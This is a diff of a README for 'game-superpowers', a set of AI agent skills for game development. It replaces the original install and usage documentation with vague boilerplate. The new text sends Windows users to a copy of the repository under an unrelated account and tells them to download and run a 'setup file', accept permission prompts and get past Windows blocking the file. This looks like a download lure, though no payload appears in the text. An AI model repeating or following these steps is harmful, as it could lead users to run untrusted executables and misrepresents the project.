@@ -1,167 +1,145 @@
-# Game Superpowers
+# 🎮 game-superpowers - Build better games with clear agent skills
 
-[简体中文](./README.zh-CN.md)
+[![Download game-superpowers](https://img.shields.io/badge/Download-Game%20Superpowers-blue?style=for-the-badge)](https://github.com/Unindustrialised-trapezium914/game-superpowers)
 
-Game development skills for Claude Code, Codex, and Gemini CLI.
+## 🚀 Getting Started
 
-Build, audit, polish, and repair game projects with reusable game-native skills.
+game-superpowers helps you work on game projects with ready-made Agent Skills for Claude Code and Codex. It is made for people who want help with game build tasks, game audits, UI polish, and release prep.
 
-## At a glance
+Use it to:
+- review a game project
+- improve menus and screens
+- check game design flow
+- clean up project structure
+- prepare a project for production
 
-- for Claude Code, Codex, and Gemini CLI
-- skills live in `skills/`
-- install locally, fork freely, use selectively
-- source of truth stays in this repo
+## 📥 Download and Run on Windows
 
-## Quickstart
+1. Open this link: https://github.com/Unindustrialised-trapezium914/game-superpowers
+2. Download the project files to your PC.
+3. If the file comes as a ZIP, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Look for the main app, setup file, or the README instructions inside the folder.
+6. If Windows asks for permission, choose Yes.
 
-### Claude
+If the page offers a setup file, use that file first. If it gives you a project folder, keep the full folder in one place so the files stay linked.
 
-Use the whole repo:
+## 🧭 What This Tool Does
 
-```bash
-claude --add-dir /path/to/game-superpowers-skills-only
-```
+game-superpowers gives you a set of reusable Agent Skills for common game work. Each skill focuses on one job, so you can move through a project in small steps.
 
-Or install into your personal skills:
+Typical tasks include:
+- build checks
+- bug hunting
+- design review
+- UI and UX cleanup
+- content polish
+- production prep
+- code and asset audit
 
-```bash
-bash scripts/install-claude-skills.sh
-```
+This helps you keep game work organized. It also gives you a clear path when a project starts to feel messy.
 
-```powershell
-powershell -ExecutionPolicy Bypass -File scripts/install-claude-skills.ps1
-```
+## 🪄 Main Uses
 
-This installs symlinks into `~/.claude/skills/` and sets up repo-local git hooks so later `git pull` and branch switches refresh those links automatically.
+### Build
+Use build skills to check if the project runs the way it should. This can help you find missing files, broken steps, and setup issues.
 
-### Codex
+### Audit
+Use audit skills to review the game from top to bottom. This can help you spot weak points in code, design, UI, and user flow.
 
-Install into your user skills:
+### Polish
+Use polish skills to improve the look and feel of the game. This can help you make screens, menus, and player steps easier to use.
 
-```bash
-bash scripts/install-codex-skills.sh
-```
+### Productionize
+Use production skills to get a project ready for real use. This can help you tighten the workflow, clean the structure, and reduce loose ends.
 
-```powershell
-powershell -ExecutionPolicy Bypass -File scripts/install-codex-skills.ps1
-```
+## 🖥️ System Setup
 
-This installs the `~/.agents/skills/game-superpowers/` package root and sets up the same auto-sync hooks for future pulls and checkouts.
+For best results on Windows, use:
+- Windows 10 or Windows 11
+- A recent web browser
+- Enough free space for your game project
+- A stable internet connection for downloads
+- Claude Code or Codex if you plan to use the skills with an AI tool
 
-Or copy or symlink selected skills into a project's `.agents/skills/`.
+If you work with larger game files, keep extra disk space free. Game projects often grow fast because of art, sound, build files, and test data.
 
-### Gemini CLI
+## 📂 How the Project Is Organized
 
-Install from the local repo:
+The repository is set up around reusable Agent Skills. That means each skill has a clear role and can be used again in new projects.
 
-```bash
-gemini extensions link /path/to/game-superpowers-skills-only
-```
+You may see folders or files for:
+- skill instructions
+- game audit workflows
+- design review steps
+- UI and UX checks
+- build and release support
+- production checklists
 
-Or install from GitHub:
+This layout helps you reuse the same process across different game projects without starting from scratch each time.
 
-```bash
-gemini extensions install https://github.com/haoshengli/game-superpowers-skills-only
-```
+## 🔧 How to Use It
 
-Gemini loads the extension through the repo-root `GEMINI.md` and the `gemini-extension.json` manifest.
+1. Open your game project.
+2. Open the game-superpowers files in your editor or AI tool.
+3. Pick the skill that fits your task.
+4. Follow the steps in that skill.
+5. Review the result before moving on.
 
-Full setup instructions: [`INSTALL.md`](./INSTALL.md)
+A good order for most projects is:
+- audit first
+- fix structure next
+- polish UI and flow
+- check build and release steps last
 
-### Updates after install
+## 🎯 Best Results
 
-- edits to existing skills apply immediately because the installed entries are symlinks back to this repo
-- added, renamed, or removed skills refresh automatically after `git pull` and branch switches
-- if you want to force a refresh manually, run `bash scripts/sync-all-skills.sh`
-- on Windows, use `powershell -ExecutionPolicy Bypass -File scripts/sync-all-skills.ps1`
+Use one task at a time. This keeps the work easy to track.
 
-## Use
+Good habits:
+- keep a backup before large changes
+- test after each step
+- write down what you changed
+- use the same skill set across the whole project
+- keep menus, prompts, and player steps simple
 
-### Entrypoint
+For game work, small changes often work better than large ones. A clean screen or a clear build step can save time later.
 
-- Claude: `/using-game-superpowers`
-- Codex: `$using-game-superpowers`
-- Gemini: ask normally, for example `Use Game Superpowers to audit this game project.`
+## 🧠 Skills Included
 
-### Example prompts
+This project focuses on skills for game development work. Common skill areas include:
+- game design review
+- interface checks
+- user flow review
+- code cleanup support
+- build and release prep
+- project audit steps
+- production checks
 
-- "Use Game Superpowers to audit this existing game project's UI/UX and feedback design."
-- "Use Game Superpowers to build a polished 2D web prototype with strong HUD and feedback."
-- "Use Game Superpowers to review whether this game is closer to first-playable or production-feature quality."
-- "Use Game Superpowers with spec-driven planning and create requirements, spec, design, and tasks for this combat feature."
+These skills help you move through the full game lifecycle, from first review to final build.
 
-## Tracks
+## 🛠️ Troubleshooting
 
-```mermaid
-flowchart TD
-    A[User request] --> B[using-game-superpowers]
-    B --> C{Classify task}
-    C -->|build| D[Build Track]
-    C -->|audit| E[Audit Track]
-    C -->|repair| F[Repair Track]
-    C -->|polish| G[Polish Track]
-    D --> H[Scope + strategy + implementation skills]
-    E --> I[Audit skills + scorecard + roadmap]
-    F --> J[Targeted repair skills]
-    G --> K[UX + feedback + verifier skills]
-```
+### The download does not open
+Check that the file finished downloading. Try again from the same link:
+https://github.com/Unindustrialised-trapezium914/game-superpowers
 
-## Optional Spec-Driven Workflow
+### Windows blocks the file
+Right-click the file and look for an option to keep or open it. Then try again.
 
-For teams that want durable planning artifacts in the target repo, Game Superpowers now supports a lightweight OpenSpec-inspired workflow.
+### The folder looks empty
+Make sure you extracted the ZIP file fully. Some files may stay hidden until extraction finishes.
 
-- living specs: `specs/<capability>/spec.md`
-- change package: `changes/<change-id>/proposal.md`, `design.md`, `tasks.md`
-- spec delta: `changes/<change-id>/specs/<capability>/spec.md`
+### The project does not run
+Check that you opened the right folder and followed the setup steps in order. If the project depends on another tool, install that tool first.
 
-Use `game-spec-driven-planning` when the user explicitly asks for `requirements/spec/design/tasks`, references OpenSpec, or wants repo-native planning artifacts that survive across sessions.
+### The AI tool does not find the skills
+Confirm that the skill files are in the right place and that you opened the correct project folder.
 
-## Repo Layout
+## 🗂️ Topics
 
-- `skills/` — the full Game Superpowers skill library
-- `schemas/` — shared structured output schemas
-- `shared/` — templates, references, checklists, and examples
-- `.claude/skills/` — Claude Code discovery symlinks pointing back to `skills/`
-- `.agents/skills/` — Codex discovery symlinks pointing back to `skills/`
-- `scripts/` — installers, auto-sync hooks, and validation helpers
+agent-skills, ai-native, claude-code, codex, developer-tools, game-audit, game-design, game-development, skills, ui-ux
 
-Notes:
+## 📌 What to Expect
 
-- `skills/` is the only source of truth
-- `.claude/skills/` and `.agents/skills/` are compatibility paths, not a second copy of the library
-- if your platform or archive tool handles symlinks poorly, inspect `skills/` first
-
-## Library
-
-- bootstrap and routing skills
-- optional spec-driven planning for durable change artifacts
-- build planning and strategy skills
-- UX, UI, and feedback skills
-- mechanics and systems skills
-- production and live patch skills
-- audit and scorecard skills
-- browser specialist skills for 2D and 3D web work
-
-## Development
-
-Read these first:
-
-- `skills/using-game-superpowers/SKILL.md`
-- `skills/game-super-build/SKILL.md`
-- `skills/game-project-audit/SKILL.md`
-- `skills/game-ux-flow-audit/SKILL.md`
-- `skills/game-feedback-design/SKILL.md`
-
-Before opening a pull request, run:
-
-```bash
-python3 scripts/validate_skills.py
-```
-
-See [`CONTRIBUTING.md`](./CONTRIBUTING.md) for repository change rules and local validation.
-See [`CODE_OF_CONDUCT.md`](./CODE_OF_CONDUCT.md) for collaboration expectations.
-
-## License
-
-MIT
+game-superpowers is useful when you want a more structured way to work on game projects. It gives you a repeatable path for review, cleanup, and release work. If your project has rough edges, this kind of skill set can help you move through it with less guesswork
